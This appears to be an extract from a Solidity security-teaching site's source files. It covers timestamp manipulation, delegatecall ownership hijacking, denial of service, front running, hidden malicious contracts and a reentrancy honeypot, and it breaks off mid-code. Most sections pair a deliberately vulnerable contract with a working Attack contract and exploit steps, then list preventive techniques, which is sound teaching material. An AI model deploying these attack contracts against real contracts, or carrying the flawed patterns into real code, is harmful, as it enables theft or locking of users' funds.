Manipulation\"\nexport const description = \"An example of a Solidity contract vulnerable to block timestamp manipulation\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p><code>block.timestamp</code> can be manipulated by miners with the following constraints</p>\n<ul>\n<li>it cannot be stamped with an earlier time than its parent</li>\n<li>it cannot be too far in the future</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nRoulette is a game where you can win all of the Ether in the contract\nif you can submit a transaction at a specific timing.\nA player needs to send 10 Ether and wins if the block.timestamp % 15 == 0.\n*/</span>\n\n<span class=\"hljs-comment\">/*\n1. Deploy Roulette with 10 Ether\n2. Eve runs a powerful miner that can manipulate the block timestamp.\n3. Eve sets the block.timestamp to a number in the future that is divisible by\n   15 and finds the target block hash.\n4. Eve&#x27;s block is successfully included into the chain, Eve wins the\n   Roulette game.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Roulette</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> pastBlockTime;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">spin</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span> == <span class=\"hljs-number\">10</span> <span class=\"hljs-literal\">ether</span>); <span class=\"hljs-comment\">// must send 10 ether to play</span>\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> != pastBlockTime); <span class=\"hljs-comment\">// only 1 transaction per block</span>\n\n        pastBlockTime = <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span>;\n\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> % <span class=\"hljs-number\">15</span> == <span class=\"hljs-number\">0</span>) {\n            (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>}(<span class=\"hljs-string\">\"\"</span>);\n            <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n        }\n    }\n}</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>block.timestamp</code> for a source of entropy and random number</li>\n</ul>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Delegatecall\"\nexport const description = \"An example of exploits using delegatecall in Solidity\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p><code>delegatecall</code> is tricky to use and wrong usage or incorrect understanding\ncan lead to devastating results.</p>\n<p>You must keep 2 things in mind when using <code>delegatecall</code></p>\n<ol>\n<li><code>delegatecall</code> preserves context (storage, caller, etc...)</li>\n<li>storage layout must be the same for the contract calling <code>delegatecall</code> and the contract getting called</li>\n</ol>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nHackMe is a contract that uses delegatecall to execute code.\nIt it is not obvious that the owner of HackMe can be changed since there is no\nfunction inside HackMe to do so. However an attacker can hijack the\ncontract by exploiting delegatecall. Let&#x27;s see how.\n\n1. Alice deploys Lib\n2. Alice deploys HackMe with address of Lib\n3. Eve deploys Attack with address of HackMe\n4. Eve calls Attack.attack()\n5. Attack is now the owner of HackMe\n\nWhat happened?\nEve called Attack.attack().\nAttack called the fallback function of HackMe sending the function\nselector of pwn(). HackMe forwards the call to Lib using delegatecall.\nHere msg.data contains the function selector of pwn().\nThis tells Solidity to call the function pwn() inside Lib.\nThe function pwn() updates the owner to msg.sender.\nDelegatecall runs the code of Lib using the context of HackMe.\nTherefore HackMe&#x27;s storage was updated to msg.sender where msg.sender is the\ncaller of HackMe, in this case Attack.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Lib</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">pwn</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        owner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">HackMe</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n    Lib <span class=\"hljs-keyword\">public</span> lib;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">Lib _lib</span>) </span>{\n        owner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n        lib = Lib(_lib);\n    }\n\n    <span class=\"hljs-keyword\">fallback</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {\n        <span class=\"hljs-keyword\">address</span>(lib).<span class=\"hljs-built_in\">delegatecall</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">data</span>);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> hackMe;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _hackMe</span>) </span>{\n        hackMe = _hackMe;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        hackMe.<span class=\"hljs-built_in\">call</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodeWithSignature</span>(<span class=\"hljs-string\">\"pwn()\"</span>));\n    }\n}</code></pre>\n<p>Here is another example.</p>\n<p>You will need to understand how Solidity stores\nstate variables before you can understand this exploit.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nThis is a more sophisticated version of the previous exploit.\n\n1. Alice deploys Lib and HackMe with the address of Lib\n2. Eve deploys Attack with the address of HackMe\n3. Eve calls Attack.attack()\n4. Attack is now the owner of HackMe\n\nWhat happened?\nNotice that the state variables are not defined in the same manner in Lib\nand HackMe. This means that calling Lib.doSomething() will change the first\nstate variable inside HackMe, which happens to be the address of lib.\n\nInside attack(), the first call to doSomething() changes the address of lib\nstore in HackMe. Address of lib is now set to Attack.\nThe second call to doSomething() calls Attack.doSomething() and here we\nchange the owner.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Lib</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> someNumber;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">doSomething</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _num</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        someNumber = _num;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">HackMe</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> lib;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> someNumber;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _lib</span>) </span>{\n        lib = _lib;\n        owner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">doSomething</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _num</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        lib.<span class=\"hljs-built_in\">delegatecall</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodeWithSignature</span>(<span class=\"hljs-string\">\"doSomething(uint256)\"</span>, _num));\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    <span class=\"hljs-comment\">// Make sure the storage layout is the same as HackMe</span>\n    <span class=\"hljs-comment\">// This will allow us to correctly update the state variables</span>\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> lib;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> someNumber;\n\n    HackMe <span class=\"hljs-keyword\">public</span> hackMe;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">HackMe _hackMe</span>) </span>{\n        hackMe = HackMe(_hackMe);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// override address of lib</span>\n        hackMe.doSomething(<span class=\"hljs-keyword\">uint</span>(<span class=\"hljs-keyword\">uint160</span>(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>))));\n        <span class=\"hljs-comment\">// pass any number as input, the function doSomething() below will</span>\n        <span class=\"hljs-comment\">// be called</span>\n        hackMe.doSomething(<span class=\"hljs-number\">1</span>);\n    }\n\n    <span class=\"hljs-comment\">// function signature must match HackMe.doSomething()</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">doSomething</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _num</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        owner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    }\n}\n</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>Use stateless <code>Library</code></li>\n</ul>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Denail of Service\"\nexport const description = \"An example of denial of service hack in Solidity\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>There are many ways to attack a smart contract to make it unusable.</p>\n<p>One exploit we introduce here is denial of service by making the function to send Ether fail.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n<span class=\"hljs-comment\">/*\nThe goal of KingOfEther is to become the king by sending more Ether than\nthe previous king. Previous king will be refunded with the amount of Ether\nhe sent.\n*/</span>\n\n<span class=\"hljs-comment\">/*\n1. Deploy KingOfEther\n2. Alice becomes the king by sending 1 Ether to claimThrone().\n2. Bob becomes the king by sending 2 Ether to claimThrone().\n   Alice receives a refund of 1 Ether.\n3. Deploy Attack with address of KingOfEther.\n4. Call attack with 3 Ether.\n5. Current king is the Attack contract and no one can become the new king.\n\nWhat happened?\nAttack became the king. All new challenge to claim the throne will be rejected\nsince Attack contract does not have a fallback function, denying to accept the\nEther sent from KingOfEther before the new king is set.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">KingOfEther</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> king;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> balance;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">claimThrone</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span> &gt; balance, <span class=\"hljs-string\">\"Need to pay more to become the king\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = king.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> balance}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n\n        balance = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n        king = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    KingOfEther kingOfEther;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">KingOfEther _kingOfEther</span>) </span>{\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    <span class=\"hljs-comment\">// You can also perform a DOS by consuming all gas using assert.</span>\n    <span class=\"hljs-comment\">// This attack wil work even if the calling contract does not check</span>\n    <span class=\"hljs-comment\">// whether the call was successful or not.</span>\n    <span class=\"hljs-comment\">//</span>\n    <span class=\"hljs-comment\">// function () external payable {</span>\n    <span class=\"hljs-comment\">//     assert(false);</span>\n    <span class=\"hljs-comment\">// }</span>\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        kingOfEther.claimThrone{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>}();\n    }\n}</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<p>One way to prevent this is to allow the users to withdraw their Ether instead of sending it.</p>\n<p>Here is a example.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">KingOfEther</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> king;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> balance;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> balances;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">claimThrone</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span> &gt; balance, <span class=\"hljs-string\">\"Need to pay more to become the king\"</span>);\n\n        balances[king] += balance;\n\n        balance = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n        king = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withdraw</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> != king, <span class=\"hljs-string\">\"Current king cannot withdraw\"</span>);\n\n        <span class=\"hljs-keyword\">uint</span> amount = balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>];\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] = <span class=\"hljs-number\">0</span>;\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Front Running\"\nexport const description = \"An example of a Solidity contract vulnerable to front running\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>Transactions take some time before they are mined. An attacker can watch the transaction pool\nand send a transaction, have it included in a block before the original transaction.\nThis mechanism can be abused to re-order transactions to the attacker&#39;s advantage.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nAlice creates a guessing game.\nYou win 10 ether if you can find the correct string that hashes to the target\nhash. Let&#x27;s see how this contract is vulnerable to front running.\n*/</span>\n\n<span class=\"hljs-comment\">/*\n1. Alice deploys FindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\")\n3. Bob calls solve(\"Ethereum\") with gas price set to 15 gwei.\n4. Eve is watching the transaction pool for the answer to be submitted.\n5. Eve sees Bob&#x27;s answer and calls solve(\"Ethereum\") with a higher gas price\n   than Bob (100 gwei).\n6. Eve&#x27;s transaction was mined before Bob&#x27;s transaction.\n   Eve won the reward of 10 ether.\n\nWhat happened?\nTransactions take some time before they are mined.\nTransactions not yet mined are put in the transaction pool.\nTransactions with higher gas price are typically mined first.\nAn attacker can get the answer from the transaction pool, send a transaction\nwith a higher gas price so that their transaction will be included in a block\nbefore the original.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">FindThisHash</span> </span>{\n    <span class=\"hljs-keyword\">bytes32</span> <span class=\"hljs-keyword\">constant</span> <span class=\"hljs-keyword\">public</span> hash =\n      <span class=\"hljs-number\">0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">solve</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> solution</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(hash == <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(solution)), <span class=\"hljs-string\">\"Incorrect answer\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: <span class=\"hljs-number\">10</span> <span class=\"hljs-literal\">ether</span>}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>use commit-reveal scheme</li>\n<li>use submarine send</li>\n</ul>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Hiding Malicious Code with External Contract\"\nexport const description = \"An example of exploit where malicious code is hidden in an external contract in Solidity\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>In Solidity any address can be casted into specific contract,\neven if the contract at the address is not the one being casted.</p>\n<p>This can be exploited to hide malicious code. Let&#39;s see how.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nLet&#x27;s say Alice can see the code of Foo and Bar but not Mal.\nIt is obvious to Alice that Foo.callBar() executes the code inside Bar.log().\nHowever Eve deploys Foo with the address of Mal, so that calling Foo.callBar()\nwill actually execute the code at Mal.\n*/</span>\n\n<span class=\"hljs-comment\">/*\n1. Eve deploys Mal\n2. Eve deploys Foo with the address of Mal\n3. Alice calls Foo.callBar() after reading the code and judging that it is\n   safe to call.\n4. Although Alice expected Bar.log() to be execute, Mal.log() was executed.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Foo</span> </span>{\n    Bar bar;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _bar</span>) </span>{\n        bar = Bar(_bar);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">callBar</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        bar.log();\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Bar</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> message</span>)</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">log</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"Bar was called\"</span>);\n    }\n}\n\n<span class=\"hljs-comment\">// This code is hidden in a separate file</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Mal</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> message</span>)</span>;\n\n    <span class=\"hljs-comment\">// function () external {</span>\n    <span class=\"hljs-comment\">//     emit Log(\"Mal was called\");</span>\n    <span class=\"hljs-comment\">// }</span>\n\n    <span class=\"hljs-comment\">// Actually we can execute the same exploit even if this function does</span>\n    <span class=\"hljs-comment\">// not exit by using the fallback</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">log</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(<span class=\"hljs-string\">\"Mal was called\"</span>);\n    }\n}</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>Initialize a new contract inside the constructor</li>\n<li>Make the address of external contract <code>public</code> so that the code of the\nexternal contract can be reviewed</li>\n</ul>\n<pre><code class=\"language-solidity\">Bar <span class=\"hljs-keyword\">public</span> bar;\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n    bar = <span class=\"hljs-keyword\">new</span> Bar();\n}</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Honeypot\"\nexport const description = \"An example of honeypot in Solidity\"\n\nconst html = `<p>A honeypot is a trap to catch hackers.</p>\n<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p>\n<p>that will catch malicious users.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nBank is a contract that calls Logger to log events.\nBank.withdraw() is vulnerable to the reentrancy attack.\nSo a hacker tries to drain Ether from Bank.\nBut actually the reentracy exploit is a bait for hackers.\nBy deploying Bank with HoneyPot in place of the Logger, this contract becomes\na trap for hackers. Let&#x27;s see how.\n\n1. Alice deploys HoneyPot\n2. Alice deploys Bank with the address of HoneyPot\n3. Alice deposits 1 Ether into Bank.\n4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.\n5. Eve deploys Attack with the address of Bank\n6. Eve calls Attack.attack() with 1 Ether but the transaction fails.\n\nWhat happened?\nEve calls Attack.attack() and it starts withdrawing Ether from Bank.\nWhen the last Bank.withdraw() is about to complete, it calls logger.log().\nLogger.log() calls HoneyPot.log() and reverts. Transaction fails.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Bank</span> </span>{\n    <span class=\"hljs-keyword\">mapping</span> (<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> balances;\n    Logger logger;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">Logger _logger</span>) </span>{\n        logger = Logger(_logger);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] += <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n        logger.log(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>,<span class=\"hljs-string\">\"Deposit\"</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withdraw</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span 